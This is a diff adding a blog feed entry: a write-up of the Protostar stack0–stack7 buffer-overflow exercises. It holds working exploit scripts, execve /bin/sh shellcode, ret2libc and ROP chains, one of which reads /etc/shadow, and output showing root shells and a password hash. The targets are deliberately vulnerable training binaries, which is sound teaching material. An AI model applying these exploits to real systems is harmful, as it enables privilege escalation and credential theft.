@@ -4,7 +4,7 @@
   <title><![CDATA[tcunha.github.io]]></title>
   <link href="http://tcunha.github.io/atom.xml" rel="self"/>
   <link href="http://tcunha.github.io/"/>
-  <updated>2015-12-29T18:42:02+00:00</updated>
+  <updated>2015-12-29T20:17:09+00:00</updated>
   <id>http://tcunha.github.io/</id>
   <author>
     <name><![CDATA[tcunha]]></name>
@@ -12,6 +12,492 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Protostar Stack]]></title>
+    <link href="http://tcunha.github.io/blog/2015/12/29/protostar-stack/"/>
+    <updated>2015-12-29T18:58:57+00:00</updated>
+    <id>http://tcunha.github.io/blog/2015/12/29/protostar-stack</id>
+    <content type="html"><![CDATA[<h2>stack0</h2>
+
+<p>Nice refresher with regards to the volatile type qualifier. It is needed to
+prevent the compiler from optimizing it away, given that it&rsquo;s &ldquo;always&rdquo; set to
+zero (it might remove the if condition altogether). This is specially true for
+signal handlers:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">sig_atomic_t</span>    <span class="n">quit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="cm">/* Needs volatile! */</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span>
+</span><span class='line'><span class="nf">sigterm</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">quit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="n">quit</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* This might be transformed to while (true). */</span>
+</span><span class='line'>  <span class="p">...</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Given that the buffer is 64 bytes in size and the stack layout, writing one more
+will copy one over modified:</p>
+
+<pre><code>H +-------------+
+  | ...         |
+  | modified    |
+  | buffer[64]  |   /* Being power of two means that it's aligned. */
+  | ...         |
+L +-------------+
+</code></pre>
+
+<p>To trigger the condition, the following command can be issued:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;1&quot; * 65&#39;</span><span class="p">|</span>./stack0
+</span><span class='line'><span class="go">you have changed the &#39;modified&#39; variable</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>stack1</h2>
+
+<p>Like the above, given that the address of modified is four bytes above the
+buffer and (like the exercise says) by taking into account that this is a little
+endian platform (i386):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> ./stack1 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;A&quot; * 64 + &quot;\x64\x63\x62\x61&quot;&#39;</span><span class="sb">`</span>  <span class="c"># or,</span>
+</span><span class='line'><span class="go">you have correctly got the variable to the right value</span>
+</span><span class='line'><span class="gp">$</span> ./stack1 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;A&quot; * 64 + &quot;dcba&quot;&#39;</span><span class="sb">`</span>
+</span><span class='line'><span class="go">you have correctly got the variable to the right value</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>stack2</h2>
+
+<p>The same as the last one but with an environment variable:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> env <span class="nv">GREENIE</span><span class="o">=</span><span class="s2">&quot;`python -c &#39;print &quot;</span>A<span class="s2">&quot; * 64 + &quot;</span><span class="se">\x</span>0a<span class="se">\x</span>0d<span class="se">\x</span>0a<span class="se">\x</span>0d<span class="s2">&quot;&#39;`&quot;</span> ./stack2
+</span><span class='line'><span class="go">you have correctly modified the variable</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>stack3</h2>
+
+<p>Disassembling, like the exercise says, with objdump and retrieving the address
+of the win() function yields the expected results:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -d stack3|grep win</span>
+</span><span class='line'><span class="mh">08048424</span> <span class="p">&lt;</span><span class="nf">win</span><span class="p">&gt;:</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot; * 64 + &quot;\x24\x84\x04\x08&quot;&#39;</span><span class="p">|</span>./stack3
+</span><span class='line'><span class="go">calling function pointer, jumping to 0x08048424</span>
+</span><span class='line'><span class="go">code flow successfully changed</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>stack4</h2>
+
+<p>A poor man&rsquo;s fuzzer can be used to guess the EIP address (and while at it, to
+take advantage of the redirect operator in gdb, like the exercise says):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot; * offset + &quot;B&quot; * 4&#39;</span> &gt;/tmp/dump
+</span><span class='line'><span class="gp">$</span> gdb ./stack4
+</span><span class='line'><span class="go">(gdb) r &lt;/tmp/dump</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The offset should be incremented until (76) the program crashes with a segfault
+in the 0x42424242 address. Now that EIP is under control, the above can be used
+to obtain the address of win:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -d stack4|grep win</span>
+</span><span class='line'><span class="mh">080483f4</span> <span class="p">&lt;</span><span class="nf">win</span><span class="p">&gt;:</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot; * 76 + &quot;\xf4\x83\x04\x08&quot;&#39;</span><span class="p">|</span>./stack4
+</span><span class='line'><span class="go">code flow successfully changed</span>
+</span><span class='line'><span class="go">Segmentation fault</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The padding, like the exercise says, is added by the compiler.</p>
+
+<h2>stack5</h2>
+
+<p>This was kind of tricky, since the stack isn&rsquo;t in the same place inside and
+outside GDB. The environment and the arguments vector (ie argv) must be the
+same.</p>
+
+<p>First, brute-forced the number of bytes needed to overwrite EIP (76 in this
+case) and obtained the address of the stack with GDB:</p>
+
+<pre><code>$ python -c 'print "A" * 76 + "B" * 4 + "C" * 32' &gt;/tmp/boom
+$ env - TERM=xterm PWD=$PWD gdb /opt/protostar/bin/stack5
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) show env
+TERM=xterm
+PWD=/tmp
+(gdb) r &lt;/tmp/boom
+(gdb) info registers
+(gdb) x/x $esp
+0xbffffe30: 0x43434343
+</code></pre>
+
+<p>Generated the shellcode with:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> msfvenom -p linux/x86/exec -f py -a x86 --platform linux <span class="nv">CMD</span><span class="o">=</span>/bin/sh
+</span><span class='line'><span class="go">No encoder or badchars specified, outputting raw payload</span>
+</span><span class='line'><span class="go">Payload size: 43 bytes</span>
+</span><span class='line'><span class="go">buf =  &quot;&quot;</span>
+</span><span class='line'><span class="go">buf += &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;</span>
+</span><span class='line'><span class="go">buf += &quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08&quot;</span>
+</span><span class='line'><span class="go">buf += &quot;\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53&quot;</span>
+</span><span class='line'><span class="go">buf += &quot;\x89\xe1\xcd\x80&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As for the exploit:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">76</span>
+</span><span class='line'><span class="n">esp</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffffe30</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">buf</span> <span class="o">=</span>  <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53</span><span class="s">&quot;</span>
+</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x89\xe1\xcd\x80</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">esp</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">buf</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then, ensure that the environment is the same as the above (without changing
+directories due to $PWD):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>   <span class="se">\</span>
+</span><span class='line'><span class="go">  env - TERM=xterm PWD=$PWD     \</span>
+</span><span class='line'><span class="go">  /opt/protostar/bin/stack5</span>
+</span><span class='line'><span class="go">id</span>
+</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>stack6</h2>
+
+<p>With the usual methodology, it was noticed that EIP is under control when
+overwriting at least eighty characters. The traditional ret2libc with the
+system function and faking a stack frame works as expected:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">80</span>
+</span><span class='line'><span class="n">sys</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>    <span class="c"># system(3)</span>
+</span><span class='line'><span class="n">sh</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffb8</span><span class="p">)</span>     <span class="c"># /bin/sh</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sys</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;FAKE&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sh</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The /bin/sh address might need the usual guessing and setting a regular
+environment inside and outside GDB:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>                   <span class="se">\</span>
+</span><span class='line'><span class="go">  env - SHELL=/bin/sh TERM=xterm PWD=$PWD       \</span>
+</span><span class='line'><span class="go">  /opt/protostar/bin/stack6</span>
+</span><span class='line'><span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAA��AKE����</span>
+</span><span class='line'><span class="go">id</span>
+</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As for the ROP one, I&rsquo;ve opted by using a rather pointless open(2), read(2),
+write(2) and finally system(3) chain to play around a little. The gadgets
+addresses can be obtained by using objdump. Jumping to the middle of a multiple
+pop sequence might be needed and that&rsquo;s okay.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">80</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># int open(const char *, int);</span>
+</span><span class='line'><span class="n">openaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7f537a0</span><span class="p">)</span>
+</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048452</span><span class="p">)</span>
+</span><span class='line'><span class="n">openpath</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffd6</span><span class="p">)</span>       <span class="c"># SHADOW variable.</span>
+</span><span class='line'><span class="n">openflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>              <span class="c"># O_RDONLY</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># ssize_t read(int, void *, size_t);</span>
+</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7f53c00</span><span class="p">)</span>
+</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048576</span><span class="p">)</span>
+</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">)</span>                <span class="c"># Only the standard ones are open.</span>
+</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffff73c</span><span class="p">)</span>        <span class="c"># getpath() buffer.</span>
+</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>              <span class="c"># 64 bytes.</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># ssize_t write(int, const void *, size_t);</span>
+</span><span class='line'><span class="n">writeaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7f53c70</span><span class="p">)</span>
+</span><span class='line'><span class="n">writefd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">)</span>               <span class="c"># stderr is unbuffered.</span>
+</span><span class='line'><span class="n">writebuf</span> <span class="o">=</span> <span class="n">readbuf</span>
+</span><span class='line'><span class="n">writecnt</span> <span class="o">=</span> <span class="n">readcnt</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># int system(const char *);</span>
+</span><span class='line'><span class="n">sysaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>
+</span><span class='line'><span class="n">pointless</span> <span class="o">=</span> <span class="s">&quot;FAKE&quot;</span>
+</span><span class='line'><span class="n">syscmd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffc7</span><span class="p">)</span>         <span class="c"># SHELL variable.</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">openaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">openpath</span> <span class="o">+</span> <span class="n">openflgs</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">writeaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">writefd</span> <span class="o">+</span> <span class="n">writebuf</span> <span class="o">+</span> <span class="n">writecnt</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sysaddr</span> <span class="o">+</span> <span class="n">pointless</span> <span class="o">+</span> <span class="n">syscmd</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Beware that the environment inherited from the parent may play tricks due to not
+being the same. Executing it through a clean environment all the time, such as
+the one below, solves this kind of issues:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>                                  <span class="se">\</span>
+</span><span class='line'><span class="go">  env - TERM=xterm PWD=$PWD SHELL=/bin/sh SHADOW=/etc/shadow   \</span>
+</span><span class='line'><span class="go">  /opt/protostar/bin/stack6</span>
+</span><span class='line'><span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�7��AAAAAAAAAAAA�7��R��</span>
+</span><span class='line'><span class="gp">root:$6$gOA4/iAf$</span>EMw.4yshZLZxjlf./VmnEVQ20QsEmdzZa73csPGYGG6KC.rid
+</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The stack with the above ROP will look like:</p>
+
+<pre><code>H +---------------------+
+  | ret (the variable)  |
+  | buffer [0x41 * 80]  | &lt;= 0xbffff73c
+  | open(2)             | &lt;= 0xb7f537a0
+  | POP POP RET         | &lt;= 0x08048452
+  | /etc/shadow         | &lt;= SHADOW variable.
+  | openflgs            | &lt;= O_RDONLY
+  | read(2)             | &lt;= 0xb7f53c00
+  | POP POP POP RET     | &lt;= 0x08048576
+  | 0x3                 |
+  | buffer              | &lt;= 0xbffff73c
+  | 0x40                |
+  | write(2)            | &lt;= 0xb7f53c70
+  | POP POP POP RET     | &lt;= 0x08048576
+  | 0x2                 |
+  | buffer              | &lt;= 0xbffff73c
+  | 0x40                |
+  | system(3)           | &lt;= 0xb7ecffb0
+  | FAKE                |
+  | /bin/sh             | &lt;= SHELL variable.
+L +---------------------+
+</code></pre>
+
+<h2>stack7</h2>
+
+<p>Like the one above, this also places restrictions in the address that we are
+allowed to jump to. Therefore, like the exercise says we need to bypass this
+restriction by returning to a text section.</p>
+
+<p>Decided with a straight ret opcode one, that pops the last value from the stack
+and updates EIP to that address (the system(3) function).</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">80</span>
+</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080484c2</span><span class="p">)</span>    <span class="c"># the ret instruction (frame_dummy)</span>
+</span><span class='line'><span class="n">sys</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>    <span class="c"># system(3)</span>
+</span><span class='line'><span class="n">sh</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffbd</span><span class="p">)</span>     <span class="c"># /bin/sh</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">ret</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sys</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;FAKE&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sh</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>                   <span class="se">\</span>
+</span><span class='line'><span class="go">  env - TERM=xterm PWD=$PWD SHELL=/bin/sh       \</span>
+</span><span class='line'><span class="go">  /opt/protostar/bin/stack7</span>
+</span><span class='line'><span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AKE��</span>
+</span><span class='line'><span class="go">id</span>
+</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[ROP Primer: 0.2]]></title>
